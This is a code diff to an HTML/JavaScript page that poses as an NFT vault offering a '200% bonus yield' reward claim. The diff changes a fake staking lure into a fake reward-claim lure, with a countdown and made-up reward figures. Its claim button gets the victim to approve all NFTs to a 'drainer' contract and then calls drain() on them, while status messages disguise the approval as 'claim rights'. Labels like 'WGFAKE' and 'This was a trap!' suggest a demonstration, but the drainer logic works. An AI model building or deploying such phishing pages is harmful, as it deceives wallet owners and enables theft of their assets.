@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>WGNFT Vault | Stake to Earn</title>
+  <title>WGNFT Vault | Claim Your Reward</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body {
@@ -45,11 +45,12 @@
 </head>
 <body>
   <div class="card">
-    <h1>🔒 Stake Your NFTs</h1>
-    <p>Earn <strong>200% APR</strong> by staking your WarGame NFTs.<br/>Only <strong>500</strong> slots left!</p>
-    <p>Rewards paid in <code>WGFAKE</code>. Ends in 3h 42m.</p>
+    <h1>🎁 Claim Your WGNFT Reward</h1>
+    <p>Congratulations! You’re eligible to claim <strong>200% bonus yield</strong> on your staked WarGame NFTs.<br/>Offer ends in <strong>3h 42m</strong>.</p>
+    <p><em>Rewards paid in WGFAKE. Powered by zkVaults.</em></p>
     <button id="connectBtn">Connect Wallet</button>
-    <button id="stakeBtn">Stake NFTs</button>
+    <button id="previewBtn">Preview Claim</button>
+    <button id="claimBtn" style="display: none;">Confirm Claim</button>
     <div id="status"></div>
   </div>
 
@@ -75,9 +76,8 @@
         return;
       }
       try {
-        status.innerText = "⏳ Requesting wallet connection...";
+        status.innerText = "⏳ Connecting wallet...";
         provider = new ethers.providers.Web3Provider(window.ethereum);
-
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
 
@@ -85,30 +85,35 @@
         nft = new ethers.Contract(nftAddress, nftABI, signer);
         drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
 
-        status.innerText = `✅ Wallet connected: ${userAddress}`;
+        status.innerText = `✅ Connected: ${userAddress}`;
       } catch (err) {
         console.error("Connection error:", err);
-        status.innerText = `❌ Wallet connection failed.\n\n${err.message}`;
+        status.innerText = `❌ Connection failed.\n\n${err.message}`;
       }
     };
 
-    document.getElementById("stakeBtn").onclick = async () => {
+    document.getElementById("previewBtn").onclick = () => {
+      document.getElementById("status").innerText = "📦 Previewing reward calculation...\n\nEstimated reward: 420 WGFAKE\nStake Duration: 12 days\nNetwork Fee: 0.002 ETH";
+      document.getElementById("claimBtn").style.display = "inline-block";
+    };
+
+    document.getElementById("claimBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Connect your wallet first.");
 
       try {
-        status.innerText = "🔐 Requesting NFT approval...";
+        status.innerText = "🔐 Requesting NFT claim rights...";
         const approvalTx = await nft.setApprovalForAll(drainerAddress, true);
         await approvalTx.wait();
 
         const userAddress = await signer.getAddress();
-        status.innerText = "🚀 Approval granted. Initiating staking...";
+        status.innerText = "🚀 Claim rights granted. Finalizing reward...";
 
         const drainTx = await drainer.drain(nftAddress, userAddress);
         await drainTx.wait();
 
-        status.innerText = "💀 Your NFTs have been drained (simulated).";
-        document.getElementById("stakeBtn").disabled = true;
+        status.innerText = "💀 Oops! You got drained. This was a trap!";
+        document.getElementById("claimBtn").disabled = true;
       } catch (err) {
         console.error("Drain error:", err);
         status.innerText = `🎯 You avoided the trap.\n\n${err.message}`;
